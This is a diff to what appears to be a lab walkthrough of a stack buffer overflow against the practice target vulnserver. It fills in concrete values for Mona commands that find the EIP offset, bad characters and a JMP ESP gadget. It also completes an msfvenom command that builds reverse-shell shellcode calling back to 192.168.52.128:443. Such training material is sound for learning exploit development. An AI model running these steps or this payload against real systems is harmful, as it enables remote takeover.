@@ -135,7 +135,7 @@ As expected, vulnserver crashes. Note that EIP value is overwritten by the patte
 Grab the EIP content and find the offset:
 
 ```
-!mona po <eip_value>
+!mona po 386f4337
 ```
 
 The offset is 2003:
@@ -244,7 +244,7 @@ Run the script and vulnserver crashes. We will use this ESP value to find badcha
 Find badchars using Mona:
 
 ```
-!mona compare -f c:\mona\bytearray.bin -a <esp_value>
+!mona compare -f c:\mona\bytearray.bin -a 0115f9c8
 ```
 
 There is no badchar:
@@ -258,7 +258,7 @@ If any badchar is found, delete this badchar from the script and run it again. R
 Find a JMP ESP gadget using Mona:
 
 ```
-!mona jmp -r esp -cpb "<badchars>"
+!mona jmp -r esp -cpb "\x00"
 ```
 
 Go to "Log" by pressing Alt+L. Mona finds 9 gadgets and we can pick any gadget in this case:
@@ -270,7 +270,7 @@ Go to "Log" by pressing Alt+L. Mona finds 9 gadgets and we can pick any gadget i
 Generate a shellcode using Msfvenom:
 
 ```bash
-msfvenom -p windows/shell_reverse_tcp LHOST=192.168.52.128 LPORT=443 EXITFUNC=thread -f python -a x86 -b "<badchars>"
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.52.128 LPORT=443 EXITFUNC=thread -f python -a x86 -b "\x00"
 ```
 
 Write the final script:
